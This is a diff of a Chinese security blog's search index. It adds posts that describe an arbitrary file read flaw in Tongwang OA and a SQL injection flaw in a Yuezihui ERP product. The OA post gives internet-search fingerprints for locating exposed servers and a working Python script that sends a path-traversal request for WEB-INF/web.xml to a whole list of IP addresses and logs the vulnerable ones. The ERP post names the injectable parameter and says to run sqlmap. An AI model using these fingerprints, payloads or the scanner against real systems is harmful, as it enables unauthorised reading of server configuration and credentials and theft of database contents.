@@ -183,6 +183,51 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
+    <title>Tong Wang OA tooneAssistantAttachement File read</title>
+    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
+    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
+<p>​
+同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
+<ul>
+<li>Fofa：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Hunter：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Quake：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用脚本">利用脚本</h4>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>KingH5Stream admin login</title>
     <url>/2024/11/08/beijignyakongkeyijifazhanyouxiangongsi/</url>
     <content><![CDATA[<h2 id="漏洞位置">漏洞位置：</h2>
@@ -409,6 +454,30 @@ alt="image.png"
       </tags>
   </entry>
   <entry>
+    <title>Yue zi ERP SQL inject</title>
+    <url>/2024/11/08/wuhanjintongfangyuezihuisuoerpsql/</url>
+    <content><![CDATA[<h2 id="漏洞描述">漏洞描述</h2>
+<p>月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。武汉金同方科技月子会ERP管理云平台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库全部敏感信息。
+该系统GraphicManagementEdit.aspx文件的id参数存在SQL注入</p>
+<h2 id="漏洞位置">漏洞位置：</h2>
+<p>/Page/BasicInfo/GraphicManagementEdit.aspx?id=1</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d8bf6d29ded1a8ce3f0fb.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>直接跑sqlmap</p>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>红队信息搜集思路</title>
     <url>/2024/11/12/red%20team%20information%20search/</url>
     <content><![CDATA[<h3 id="方针">方针</h3>
@@ -495,30 +564,6 @@ alt="img"
 ]]></content>
       <tags>
         <tag>RT</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Yue zi ERP SQL inject</title>
-    <url>/2024/11/08/wuhanjintongfangyuezihuisuoerpsql/</url>
-    <content><![CDATA[<h2 id="漏洞描述">漏洞描述</h2>
-<p>月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。武汉金同方科技月子会ERP管理云平台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库全部敏感信息。
-该系统GraphicManagementEdit.aspx文件的id参数存在SQL注入</p>
-<h2 id="漏洞位置">漏洞位置：</h2>
-<p>/Page/BasicInfo/GraphicManagementEdit.aspx?id=1</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d8bf6d29ded1a8ce3f0fb.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>直接跑sqlmap</p>
-]]></content>
-      <tags>
-        <tag>day</tag>
       </tags>
   </entry>
 </search>
